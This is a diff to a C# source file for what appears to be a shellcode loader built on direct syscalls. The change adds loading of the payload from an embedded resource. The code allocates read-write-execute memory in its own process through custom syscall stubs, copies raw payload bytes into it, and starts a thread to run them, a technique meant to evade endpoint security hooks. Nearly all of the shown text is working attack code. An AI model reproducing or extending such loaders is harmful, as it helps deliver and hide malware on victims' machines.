@@ -4,35 +4,45 @@ using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Reflection;
+using System.IO;
 
 namespace MySyscall
 {
     class Execute
     {
+        public static byte[] mybytearr;
         public static void Exec() 
         {
-            Stack<byte> recvStack = GetCode.CodeStack();
-            byte[] payload = new byte[recvStack.Count];
-            int payloadLen = recvStack.Count;
-            for (int i = 0; i <= payloadLen; i++)
+            if (GetCode.UseRaw == true)
             {
-                try
+                mybytearr = GetEmbeddedBin("dotnetlib");
+            }
+            else
+            {
+                Stack<byte> recvStack = GetCode.CodeStack();
+                mybytearr = new byte[recvStack.Count];
+                int mybytearrLen = recvStack.Count;
+                for (int i = 0; i <= mybytearrLen; i++)
                 {
-                    payload[i] = recvStack.Pop();
-                }
-                catch { break; }
+                    try
+                    {
+                        mybytearr[i] = recvStack.Pop();
+                    }
+                    catch { break; }
 
+                }
             }
             Gsyscallstub.Set_NtdllBaseADDR();
             IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle;
             IntPtr pMemoryAllocation = new IntPtr();
             IntPtr pZeroBits = IntPtr.Zero;
-            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length));
+            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(mybytearr.Length));
             uint allocationType = (uint)WinNativeshit.Native.AllocationType.Commit | (uint)WinNativeshit.Native.AllocationType.Reserve;
             uint protection = (uint)WinNativeshit.Native.AllocationProtect.PAGE_EXECUTE_READWRITE;
             var ntAllocResult = NativeAPI.MYNAVM(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
 
-            Marshal.Copy(payload, 0, (IntPtr)pMemoryAllocation, payload.Length);
+            Marshal.Copy(mybytearr, 0, (IntPtr)pMemoryAllocation, mybytearr.Length);
 
             IntPtr hThread = new IntPtr(0);
             WinNativeshit.Native.ACCESS_MASK desiredAccess = WinNativeshit.Native.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | WinNativeshit.Native.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
@@ -49,6 +59,27 @@ namespace MySyscall
             var result = NativeAPI.MYWFSO(hThread, true, 0);
 
 
+        }
+        public static byte[] GetEmbeddedBin(string resourcesName) 
+        {
+
+            var EmbeddedRes = Assembly.GetExecutingAssembly();
+            using (var rs = EmbeddedRes.GetManifestResourceStream(resourcesName))
+            {
+                if (rs != null)
+                {
+                    using (var ms = new MemoryStream())
+                    {
+                        rs.CopyTo(ms);
+                        return ms.ToArray();
+                    }
+                }
+                else
+                {
+                    return null;
+                }
+
+            }
         }
     }
 }
